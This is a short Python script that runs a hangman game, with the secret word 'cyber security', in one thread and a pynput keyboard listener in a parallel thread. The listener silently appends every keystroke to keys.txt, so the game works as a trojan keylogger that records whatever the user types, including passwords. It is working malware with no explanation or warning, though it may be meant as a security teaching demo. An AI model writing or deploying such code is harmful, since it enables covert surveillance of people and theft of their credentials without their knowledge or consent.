from pynput.keyboard import Key, Listener

import threading

def write_file():
    def on_press(key):
        with open("keys.txt", "a") as writer:
            writer.write(str(key))

    with Listener(on_press=on_press) as listener:
        listener.join()

    print("end")

def hang_man():
    word = 'cyber security'
    allowed_errors = 7
    done = False
    guesses = []
    while not done:
        for letter in word:
            if letter.lower()  in guesses :
                print(letter, end= ' ')
            else:
                print("_", end = ' ')
        print("")

        guess = input(f' Allowed guesses: {allowed_errors}, Next Guess :')
        guesses.append(guess.lower())
        if guess.lower() not in word.lower():
            allowed_errors -=1
            if allowed_errors == 0 :
                break

        done = True
        for letter in word:
            if letter.lower() not in guesses:
                done = False


    if done:
        print(f'you found the word! it was {word}')

    else:
        print(f'Game Over! the word was {word}')



def main():
    y = threading.Thread(target=hang_man)
    x = threading.Thread(target=write_file)
    y.start()
    x.start()

if __name__ == '__main__':
    main()